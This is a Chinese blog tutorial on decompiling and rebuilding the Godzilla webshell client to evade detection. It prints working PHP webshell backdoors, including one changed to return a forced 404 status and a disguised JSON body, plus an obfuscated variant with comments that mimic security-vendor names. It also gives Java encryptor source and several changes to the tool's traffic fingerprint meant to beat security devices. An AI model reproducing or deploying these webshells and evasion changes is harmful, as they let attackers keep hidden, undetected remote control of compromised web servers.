@@ -1,0 +1,565 @@
+<hr>
+<p>title: 哥斯拉二开从0到1<br>date: 2024-09-03 10:21:28<br>tags: [godzilla]<br>updated:<br>categories:<br>keywords:<br>description:<br>top_img: /images/哥斯拉二开从0到1/image-20241114102655833.png<br>comments:<br>cover: /images/哥斯拉二开从0到1/image-20241114102655833.png<br>toc:<br>toc_number:<br>copyright:<br>copyright_author:<br>copyright_author_href:<br>copyright_url:<br>copyright_info:<br>mathjax:<br>katex:<br>aplayer:<br>highlight_shrink:<br>aside:</p>
+<hr>
+<p>最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="image-20241114102655833"></p>
+<h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>php5.2  php7.4 java 1.8</p>
+<p>准备工作，这里还是建议使用idea，我用vscode  调，第一步配环境就给我卡死了，调了很久都没有调明白，太菜了。</p>
+<p>首先致敬一下原版哥斯拉，原版地址<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
+<p>我们这里使用的最新的<a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">v4.0.1-godzilla</a>版本，进行逆向及二开。</p>
+<p>反编译网址，<a href="https://www.decompiler.com/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%85%A5jar%E5%8C%85%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%BE%88%E6%96%B9%E4%BE%BF%E3%80%82">https://www.decompiler.com/，直接拖入jar包即可，很方便。</a></p>
+<p>当然也可以使用idea的插件进行反编译，都一样。</p>
+<p>ok开始</p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>先改个名称试试看</p>
+<p>下载好原版哥斯拉，然后拖到反编译网站，反编译完成后会看到一个压缩包，解压。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903145356766.png" alt="image-20240903145356766"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903145521615.png" alt="image-20240903145521615"></p>
+<p>然后新建一个lib目录，将原版的godzilla拖进去，在将刚刚反编译后的目录拖到项目目录下</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903150913660.png" alt="image-20240903150913660"></p>
+<p>接着建立依赖关系。</p>
+<p>settings-&gt;Project Structure</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153231158.png" alt="image-20240903153231158"></p>
+<p>然后设置依赖添加我们上面lib里的哪个原版jar包，并且选中，这里笔者建议用jdk1.8，我用java15好像不太行</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153401751.png" alt="image-20240903153401751"></p>
+<p>接着添加主类，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153706210.png" alt="image-20240903153706210"></p>
+<p>走到这一步，我们会发现，并没有其他大佬文章中说的有ui里的那个主类，是因为少了一部。</p>
+<p>我们接着要将反编译的src\META-INF/MANIFEST.MF源文件，放到src下面，注意路径。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903154657989.png" alt="image-20240903154657989"></p>
+<p>然后同样复制decompiled_src/core/ui/MainActivity.java文件到src目录下</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903154931142.png" alt="image-20240903154931142"></p>
+<p>这样即可</p>
+<p>接着添加主类，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153706210.png" alt="image-20240903153706210"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903155037743.png" alt="image-20240903155037743"></p>
+<p>即可。</p>
+<h5 id="改标题"><a href="#改标题" class="headerlink" title="改标题"></a>改标题</h5><p>现在就可以编译了，我们先简单的改一下标题。</p>
+<p>复制一份文件，godzilla的标题在core/MainActivity.java复制src/core/MainActivity.java，没有的目录要创建一下。目录一定要对齐。这里一定要清楚，不要在原版的那个和编译的那些文件里改，想改什么，把目录对齐，创建复制文件。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160041594.png" alt="image-20240903160041594"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160220038.png" alt="image-20240903160220038"></p>
+<p>欧克，接下来编译</p>
+<p>先build project</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160353962.png" alt="image-20240903160353962"></p>
+<p>在build artifacts build</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160441514.png" alt="image-20240903160441514"></p>
+<p>编译完成后，在项目目录下面的out/artifacts/下面就会有编译好的godzilla</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160604410.png" alt="image-20240903160604410"></p>
+<p>接着就会发现出现hash错误，接着改，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160730366.png" alt="image-20240903160730366"></p>
+<p>在core/ApplicationConfig.java<code>复制到</code>src/core/ApplicationConfig.java，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903161356407.png" alt="image-20240903161356407"></p>
+<p>将中间的四行对比注释掉即可。</p>
+<p>然后重新build。重新artifacts编译即可。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903161513631.png" alt="image-20240903161513631"></p>
+<p>ok，没有问题。笔者这里并没有经过作者的同意去二开，和验证。奈何我太菜，联系不到大佬，如果有侵权，留个言删除。</p>
+<h5 id="全局改造"><a href="#全局改造" class="headerlink" title="全局改造"></a>全局改造</h5><p>我们知道，godzilla和Behinder都有一些强特征，我们可以加一下混淆或者简单改改。</p>
+<p>在/core/ui/component/frame/ShellSetting.java的文件中，</p>
+<p>大概290行，设置一下ua，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903164934529.png" alt="image-20240903164934529"></p>
+<p>直接给他写死，这样的话既可以每次打开不用自己改了。</p>
+<p>还有下面的，</p>
+<pre><code>this.leftTextArea.setText(&quot;page=1&amp;size=10&amp;&quot;);
+this.rightTextArea.setText(&quot;&amp;Name=manager&quot;);
+</code></pre>
+<p>左右追加数据，我们也给他写死，这样，就不用每次写了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903170904953.png" alt="image-20240903170904953"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903171100398.png" alt="image-20240903171100398"></p>
+<p>ok，比较方便，当然这里你想加什么都可以，这里只是添加一些参数。</p>
+<p>然后是一个请求体的修改，在其他大师傅的文章中看到，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104429991.png" alt="image-20240918104429991"></p>
+<p>就是这个请求包中cookie中有分号，这是一个强特征，这里咱们没有办法验证，听就行了，给他去掉，</p>
+<p>笔者改的哥斯拉版本在src\util\http\HttpResponse.java下，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104650774.png" alt="image-20240918104650774"></p>
+<p>默认是``cookies.forEach(cookie -&gt; sb.append(String.format(“ %s=%s;”, cookie.getName(), cookie.getValue())));`</p>
+<p>去掉；即可。打包编译。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104914935.png" alt="image-20240918104914935"></p>
+<p>ok，没有任何问题。</p>
+<h5 id="godzilla-结构"><a href="#godzilla-结构" class="headerlink" title="godzilla 结构"></a>godzilla 结构</h5><p>没开始之前咱们先看下一Godzilla的shell大概构造</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918105209856.png" alt="image-20240918105209856"></p>
+<p>在shell目录下，有三个目录，一个是加密 解密模块，也就是发送的payload的在本地加密，发送，从客户端解密返回给用户，payload就是各种功能，比如读取，上传，文件、数据库的操作等等，plugins很好理解，就是各种语言的插件，bypassdisable_function，提权，压缩，内存马等等。</p>
+<p>这里说一个shell目录，shell目录下有各种语言的shell，每个语言下有一个Generate.java文件，他是用来生成godzilla木马的框架。然后就是要生成木马。我们点开lib目录下的godzilla.jar，然后是shell  php下面的</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112104994.png" alt="image-20240918112104994"></p>
+<p>这些*.bin对应的是这个生成的加密器。也就是xor  base64啥的</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112156254.png" alt="image-20240918112156254"></p>
+<p>相应的下面三个是加密 解密数据包的代码。其他的语言也大差不差。</p>
+<p>这就是godzilla  shell方面大致的理解，目前二开godzilla用到这些就够了。其实是其他的我也不太懂。</p>
+<h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>好的，接下来我们开始改流量，先从php开始。</p>
+<p>我们先来看最原版的一句话木马，这里说一下，godzilla是支持一句话木马的。有好多同学面试的时候被问到godzilla支不支持一句话，好多同学不知道。其实他是支持。</p>
+<p>好，先来看一句话的加密器是 PHP_EVAL_XOR_BASE64，他生成的木马就是一句话&lt;?php<br>eval($_POST[“pass”]);</p>
+<p>接着我们看对应的代码，在generate中，判断有没有bin文件，然后替换pass key</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112958362.png" alt="image-20240918112958362"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113110726-17266302715431.png" alt="image-20240918113110726"></p>
+<p>eval的🐎。如果这个，我们像上面一样，在src目录下新建文件，一样可以替换掉的。</p>
+<p>然后是payload发送，在phpevalxor.java代码中，可以看到具体代码，比如异或，base64，传参等。</p>
+<p>大家可以读读代码。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113403277.png" alt="image-20240918113403277"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113415634.png" alt="image-20240918113415634"></p>
+<p>好，这里我们不去改变原有的代码，我们新加一个加密器。改的是xor然后base64的加密器。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918134822003.png" alt="image-20240918134822003"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918135051300.png" alt="image-20240918135051300"></p>
+<p>好  我们先来打包看看</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918135414650-17266388554662.png" alt="image-20240918135414650"></p>
+<p>没有问题，godzillaxor base64的木马是这样的。</p>
+<pre><code class="php">&lt;?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i&lt;strlen($D);$i++) {
+        $c = $K[$i+1&amp;15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+$pass=&#39;pass&#39;;
+$payloadName=&#39;payload&#39;;
+$key=&#39;3c6e0b8a9c15224a&#39;;
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        if (strpos($payload,&quot;getBasicsInfo&quot;)===false){
+            $payload=encode($payload,$key);
+        }
+        eval($payload);
+        echo substr(md5($pass.$key),0,16);
+        echo base64_encode(encode(@run($data),$key));
+        echo substr(md5($pass.$key),16);
+    }else{
+        if (strpos($data,&quot;getBasicsInfo&quot;)!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
+</code></pre>
+<p>在代码中，我们可以看到，</p>
+<p>eval($payload);<br>        echo substr(md5($pass.$key),0,16);<br>        echo base64_encode(encode(@run($data),$key));<br>        echo substr(md5($pass.$key),16);</p>
+<p>发送的数据报为输出pass和key的md5值前十六位，数据异或的值，接着输出后十六位</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140534539.png" alt="image-20240918140534539"></p>
+<p>这是原版的请求流量，也不是原版</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140635648.png" alt="image-20240918140635648"></p>
+<p>原版是这样的，我们刚刚定死了左右添加数据。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918140727136.png" alt="image-20240918140727136"></p>
+<p>回显包，看到MD5前16  返回值异或 和后16位。</p>
+<p>这里发送的包暂时不改了，因为发送的包改的话需要改发送的payload，返回包改了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141531019.png" alt="image-20240918141531019"></p>
+<p>在返回包的代码中有一个函数，传递了this.findStrLeft, this.findStrRight，也就是上面定义的</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141621610.png" alt="image-20240918141621610"></p>
+<p>md5的前后16位，ctrl+submiddlestr 会发现，就是将左边的数据，加返回的数据，加16位后数据</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141725742.png" alt="image-20240918141725742"></p>
+<p>ok，我们给他变下型，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918141914961.png" alt="image-20240918141914961"></p>
+<p>左右追加数据注释掉，然后添加一个返回信息。json格式。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918142315774.png" alt="image-20240918142315774"></p>
+<p>我们的木马中，可以看到是输出的MD5，这样肯定不行，我们给他改一下，改成符合我们的加密方式的。</p>
+<pre><code class="php">&lt;?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i&lt;strlen($D);$i++) {
+        $c = $K[$i+1&amp;15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+$pass=&#39;pass&#39;;
+$payloadName=&#39;payload&#39;;
+$key=&#39;3c6e0b8a9c15224a&#39;;
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        if (strpos($payload,&quot;getBasicsInfo&quot;)===false){
+            $payload=encode($payload,$key);
+        }
+                eval($payload);
+      //  echo substr(md5($pass.$key),0,16);
+       // echo base64_encode(encode(@run($data),$key));
+        //echo substr(md5($pass.$key),16);
+echo &quot;{\&quot;message\&quot;:\&quot;&quot;;
+echo base64_encode(encode(@run($data),$key));
+echo &quot;\&quot;}&quot;;
+    }else{
+        if (strpos($data,&quot;getBasicsInfo&quot;)!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
+</code></pre>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918142827258.png" alt="image-20240918142827258"></p>
+<p>好，在看下流量</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143005096.png" alt="image-20240918143005096"></p>
+<p>返回包</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143036780.png" alt="image-20240918143036780"></p>
+<p>嘿，是不是有那味了。</p>
+<p>在php中，我们可以让返回包强制404，只需在🐎里面添加http_response_code(404);即可</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143259838.png" alt="image-20240918143259838"></p>
+<p>顺便我把pass改成了search，这样再看下数据包。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918143443763.png" alt="image-20240918143443763"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918144818071.png" alt="image-20240918144818071"></p>
+<p>这样的话，我们的流量状态码就是404了，是不是猛一看，还真不好分辨，如果是新手的话，可能看设备的时候都直接略过点误报了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145047876.png" alt="image-20240918145047876"></p>
+<p>当然，你可以改成任何你喜欢的数字。</p>
+<p>发送包的pass 因为是传递键，所以我建议生成的时候，还是用一些单词，这样更有迷惑性。</p>
+<p>返回值这个fL1tMGI4YTlj有的安全设备，也被定义为危险字符，因为返回值要异或key，所以key在生成的时候也不能用默认，简单改一改。</p>
+<p>ok做戏要做全套，我们不能每次用的时候需要，来到文章拿代码，godzilla也是好用在这里。直接工具中生成，对我这种萌新比较友好。</p>
+<p>接下来，我们来看怎么在godzilla中生成木马。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145447770.png" alt="image-20240918145447770"></p>
+<p>php的generate的代码中确定了用到那个bin文件，</p>
+<p>加密器中也会判断isbin?，那我们仿照eval的加密器写，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145651220.png" alt="image-20240918145651220"></p>
+<p>直接定死或者bin文件即可。</p>
+<p>创建文件，格式对齐。别写错了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918145837517.png" alt="image-20240918145837517"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918151810623.png" alt="image-20240918151810623"></p>
+<p>最下面改一改</p>
+<pre><code class="java">//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package shells.cryptions.phpXor;
+
+import core.annotation.CryptionAnnotation;
+import core.imp.Cryption;
+import core.shell.ShellEntity;
+import java.net.URLEncoder;
+import util.Log;
+import util.functions;
+import util.http.Http;
+
+@CryptionAnnotation(
+        Name = &quot;PHP_XOR_BASE64_MESSAGES&quot;,
+        payloadName = &quot;PhpDynamicPayload&quot;
+)
+public class PhpXormessage implements Cryption {
+    private ShellEntity shell;
+    private Http http;
+    private byte[] key;
+    private boolean state;
+    private String pass;
+    private byte[] payload;
+    private String findStrLeft;
+    private String findStrRight;
+
+    public PhpXormessage() {
+    }
+
+    public void init(ShellEntity context) {
+        this.shell = context;
+        this.http = this.shell.getHttp();
+        this.key = this.shell.getSecretKeyX().getBytes();
+        this.pass = this.shell.getPassword();
+        String findStrMd5 = functions.md5(this.pass + new String(this.key));
+        //this.findStrLeft = findStrMd5.substring(0, 16);
+        //this.findStrRight = findStrMd5.substring(16);
+        this.findStrLeft = &quot;{\&quot;message\&quot;:\&quot;&quot;;
+        this.findStrRight = &quot;\&quot;}&quot;;
+
+        try {
+            this.payload = this.shell.getPayloadModule().getPayload();
+            if (this.payload != null) {
+                this.http.sendHttpResponse(this.payload);
+                this.state = true;
+            } else {
+                Log.error(&quot;payload Is Null&quot;);
+            }
+
+        } catch (Exception var4) {
+            Exception e = var4;
+            Log.error(e);
+        }
+    }
+
+    public byte[] encode(byte[] data) {
+        try {
+            return this.E(data);
+        } catch (Exception var3) {
+            Exception e = var3;
+            Log.error(e);
+            return null;
+        }
+    }
+
+    public byte[] decode(byte[] data) {
+        if (data != null &amp;&amp; data.length &gt; 0) {
+            try {
+                return this.D(this.findStr(data));
+            } catch (Exception var3) {
+                Exception e = var3;
+                Log.error(e);
+                return null;
+            }
+        } else {
+            return data;
+        }
+    }
+
+    public boolean isSendRLData() {
+        return true;
+    }
+
+    public byte[] E(byte[] cs) {
+        int len = cs.length;
+
+        for(int i = 0; i &lt; len; ++i) {
+            cs[i] ^= this.key[i + 1 &amp; 15];
+        }
+
+        return (this.pass + &quot;=&quot; + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
+    }
+
+    public byte[] D(String data) {
+        byte[] cs = functions.base64Decode(data);
+        int len = cs.length;
+
+        for(int i = 0; i &lt; len; ++i) {
+            cs[i] ^= this.key[i + 1 &amp; 15];
+        }
+
+        return cs;
+    }
+
+    public String findStr(byte[] respResult) {
+        String htmlString = new String(respResult);
+        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
+    }
+
+    public boolean check() {
+        return this.state;
+    }
+
+    public byte[] generate(String password, String secretKey) {
+        return (new String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream(&quot;template/xorbase64message.bin&quot;)))).replace(&quot;{pass}&quot;, password).replace(&quot;{secretKey}&quot;, functions.md5(secretKey).substring(0, 16)).getBytes();
+    }
+}
+</code></pre>
+<p>然后bin文件写好</p>
+<pre><code class="php">&lt;?php
+http_response_code(404);
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i&lt;strlen($D);$i++) {
+        $c = $K[$i+1&amp;15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+$pass=&#39;{pass}&#39;;
+$payloadName=&#39;payload&#39;;
+$key=&#39;{secretKey}&#39;;
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        if (strpos($payload,&quot;getBasicsInfo&quot;)===false){
+            $payload=encode($payload,$key);
+        }
+        eval($payload);
+        echo &quot;{\&quot;message\&quot;:\&quot;&quot;;
+        echo base64_encode(encode(@run($data),$key));
+        echo &quot;\&quot;}&quot;;
+    }else{
+        if (strpos($data,&quot;getBasicsInfo&quot;)!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
+</code></pre>
+<p>ok打包编译，</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918153555125.png" alt="image-20240918153555125"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918153824247.png" alt="image-20240918153824247"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918154134027.png" alt="image-20240918154134027"></p>
+<p>ok，这里演示已经没有问题了，我们直接做全点，</p>
+<p>用一下这个大师傅的项目，<a href="https://github.com/Tas9er/ByPassGodzilla">https://github.com/Tas9er/ByPassGodzilla</a></p>
+<p>生成一个php的码，封装到里面</p>
+<pre><code class="php">&lt;?pHP
+@session_start();
+@set_time_limit(Chr(&quot;48&quot;));
+@error_reporting/*dbappsecurityCh3yaQPIpr*/(Chr(&quot;48&quot;));
+function qianxingCgkD21wHn(/*dbappsecurityN05i2v*/$qianxinfImnkp0WMq6TX,$qianxinGYCCVkSDkVAY){
+    for($qianxinhP=Chr(&quot;48&quot;);$qianxinhP&lt;strlen($qianxinfImnkp0WMq6TX);$qianxinhP++) {
+        $qianxinqq = $qianxinGYCCVkSDkVAY[$qianxinhP+Chr(&quot;49&quot;)&amp;15];
+        $qianxinfImnkp0WMq6TX[$qianxinhP] = $qianxinfImnkp0WMq6TX[$qianxinhP]^$qianxinqq;
+    }
+    return $qianxinfImnkp0WMq6TX;
+}
+$qianxinITUfjjXmxo2 = &quot;bas&quot;.&quot;e6&quot;.Chr(&quot;52&quot;).&quot;_&quot;.&quot;de&quot;.&quot;cod&quot;.Chr(&quot;101&quot;);
+$base64_qianxingCgkD21wHn = &quot;bas&quot;.&quot;e6&quot;.Chr(&quot;52&quot;).&quot;_e&quot;.Chr(&quot;110&quot;).Chr(&quot;99&quot;).&quot;ode&quot;;
+$qianxinw7hJzkKxyi=&#39;{pass}&#39;;
+$qianxinuMq5P9IAtT1AwU=&#39;p&#39;.$qianxinITUfjjXmxo2($qianxinITUfjjXmxo2(&quot;WVhsc2IyRms=&quot;));
+$qianxin1B=&#39;{secretKey}&#39;;
+if (isset($_POST/*dbappsecurityQikjH7TyvFiC5K*/[$qianxinw7hJzkKxyi])){
+    $datqianxin7mlwRjVMRy1A=qianxingCgkD21wHn/*dbappsecurityKdu4owvmY*/($qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi]),$qianxin1B);
+    if (/*dbappsecuritybmIrEvG*/isset($_SESSION/*dbappsecurityJrZYGpRm*/[$qianxinuMq5P9IAtT1AwU])){
+        $qianxinqN=qianxingCgkD21wHn($_SESSION/*dbappsecurityqdVXl3Fu4*/[$qianxinuMq5P9IAtT1AwU],$qianxin1B);
+        if (/*dbappsecurityZIDeNEw*/strpos($qianxinqN,$qianxinITUfjjXmxo2/*dbappsecuritySC9ERptWGKU*/($qianxinITUfjjXmxo2(&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;)))===false){
+            $qianxinqN=qianxingCgkD21wHn/*dbappsecurityt9vgwbR6Nu*/($qianxinqN,$qianxin1B);
+        }
+                define(&quot;qianxinhRs0Ff&quot;,&quot;//qianxinUJEoZGk\r\n&quot;.$qianxinqN);
+                eval(qianxinhRs0Ff);
+                                echo &quot;{\&quot;message\&quot;:\&quot;&quot;;
+                        echo $base64_qianxingCgkD21wHn(qianxingCgkD21wHn(@run($datqianxin7mlwRjVMRy1A),$qianxin1B));
+                                echo &quot;\&quot;}&quot;;
+    }else{
+        if (strpos/*dbappsecurityGS4ujb8wCNv1LjR*/($datqianxin7mlwRjVMRy1A,$qianxinITUfjjXmxo2($qianxinITUfjjXmxo2(&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;)))!==false){
+            $_SESSION[$qianxinuMq5P9IAtT1AwU]=qianxingCgkD21wHn($datqianxin7mlwRjVMRy1A,$qianxin1B);
+        }
+    }
+}
+
+</code></pre>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918181736832.png" alt="image-20240918181736832"></p>
+<p>换成我们的代码，中间key和pass替换一下。</p>
+<p>生成好的php代码即可直接使用。</p>
+<p>这里注意一下，如果我们改xorbase的代码，添加的那个文件要扣xorbase64的代码，要不然eval代码用xorbase64的payload肯定用不了。</p>
+<p>笔者这里研究xorraw,没研究明白，只是研究了一丢丢</p>
